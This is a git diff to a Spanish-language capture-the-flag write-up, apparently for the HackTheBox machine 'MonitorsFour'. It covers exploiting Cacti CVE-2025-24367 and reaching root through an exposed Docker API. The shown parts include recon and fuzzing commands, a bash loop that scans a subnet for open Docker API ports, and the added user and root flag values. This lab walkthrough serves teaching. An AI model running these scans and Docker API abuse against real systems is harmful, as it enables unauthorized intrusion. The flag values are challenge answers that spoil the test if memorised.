@@ -8,7 +8,7 @@ tags:
   - Web
   - CVE
   - Privilege Escalation
-summary: "Explotación de Cacti vulnerable (CVE-2025-24367) para obtener acceso de usuario y posterior escalada a root mediante Docker API y contenedores." 
+summary: "Explotación de Cacti vulnerable (CVE-2025-24367) para obtener acceso de usuario y posterior escalada a root mediante Docker API y contenedores."
 ---
 
 ## Información general
@@ -43,7 +43,7 @@ feroxbuster -u http://monitorsfour.htb -t 50
 wfuzz -H "Host: FUZZ.monitorsfour.htb" --hc 404,403 -c --hh 138 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://monitorsfour.htb
 ```
 
-![](/images/writeups/monitorsfour/Pasted%20image%2020260512110236.png)
+![Reconocimiento](/images/writeups/monitorsfour/Pasted image 20260521120236.png)
 
 ```bash
 curl -s http://cacti.monitorsfour.htb/cacti/cacti.sql -o cacti.sql
@@ -76,7 +76,7 @@ python3 exploit.py
 ```
 
 ```bash
-# Ejemplo de interacción del exploit (censurado)
+# Interacción del exploit (censurada)
 # Username: marcus
 # Password: [REDACTED]
 ```
@@ -98,6 +98,8 @@ DB_PASSWORD=[REDACTED]
 cat user.txt
 ```
 
+**Valor:** `9b3af7e5094c885ccfad7b115587df41`
+
 ## Escalada de privilegios
 
 ```bash
@@ -105,7 +107,7 @@ cat << 'EOF' > scan.sh
 for i in $(seq 1 254); do
   ip="192.168.65.$i"
   timeout 1 bash -c "curl -s http://$ip:2375/version | grep -q 'ApiVersion'" 2>/dev/null && echo "[+] Docker API OPEN: $ip:2375"
-done
+ done
 EOF
 ```
 
@@ -148,3 +150,9 @@ curl http://192.168.65.7:2375/containers/$(docker ps -aqf "name=pwned")/logs?std
 ```bash
 cat /mnt/host_root/Users/Administrator/Desktop/root.txt
 ```
+
+**Root Flag Valor:** `df398fa317da91fe096884185fc2edab`
+
+## Conclusión
+
+Se explotó la vulnerabilidad del Cacti (CVE‑2025‑24367) para obtener credenciales de usuario, luego se aprovechó una configuración errónea del Docker API para escalar a root y capturar la flag del sistema.
